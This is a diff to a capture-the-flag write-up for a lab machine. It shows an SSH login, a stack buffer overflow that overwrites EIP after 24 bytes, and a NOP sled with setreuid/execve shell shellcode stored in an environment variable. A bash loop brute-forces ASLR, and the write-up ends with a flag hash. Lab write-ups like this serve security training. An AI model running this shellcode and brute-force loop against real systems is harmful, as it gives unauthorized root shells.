@@ -236,7 +236,6 @@ We can try to find keys to stop this (good luck). Or... you can think. This pops
 ```bash
 ssh level6@192.168.1.186 -t "/bin/bash"
 level6@192.168.1.186's password: 
-Permission denied, please try again.
 level6@harmonie-technologie:~$
 ```
 We see with `sudo -l` we can execute a binary named `1up`
@@ -484,12 +483,12 @@ root@kali:~# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 
 ```
 After 24 letters, we overwrite `EIP` register. Next we want to store our shellcode in memory. One way to achieve that purpose is to put it in environment variable. We put few NOPs instructions before our shellcode to give us latitude when our program will need our shellcode. 
 ```bash
-export SC=$(python -c 'print "\x90"*300 + "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80"')
+export SC=$(python -c 'print "\x90"*30000 + "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80"')
 ```
 We retrieve our shellcode address
 ```bash
 levelfinal@harmonie-technologie:~$ ./getEnvAddress SC
-SC is located at 0xbfd67e13
+SC is located at 0xbfd2fa0f
 ```
 We gather all these informations and write the following command
 ```bash
@@ -497,9 +496,9 @@ We gather all these informations and write the following command
 ```
 This probably works without ASLR protection. But here, it is enabled. But we are on a 32 bits machine, and we can simply bruteforce it... To that purpose, let's add some bash around our python command.
 ```bash
-levelfinal@harmonie-technologie:~$ for i in {1..66000}; do echo number of tries: $i && ./levelfinal `python -c "print 'A'*24 + '\x13\x7e\xd6\xbf'"`&& break;echo Exploit failed;done;
+levelfinal@harmonie-technologie:~$ for i in {1..66000}; do echo number of tries: $i && ./levelfinal `python -c "print 'A'*24 + '\x15\xfa\xd2\xbf'"`&& break;echo Exploit failed;done;
 ```
-![](https://thumbs.gfycat.com/TanNiceFrigatebird-size_restricted.gif)
+![](https://thumbs.gfycat.com/MiniatureThinAmericanbulldog-size_restricted.gif)
 >00fa43a89878a45deaad751f4a7c23d2
 
 ## The end  
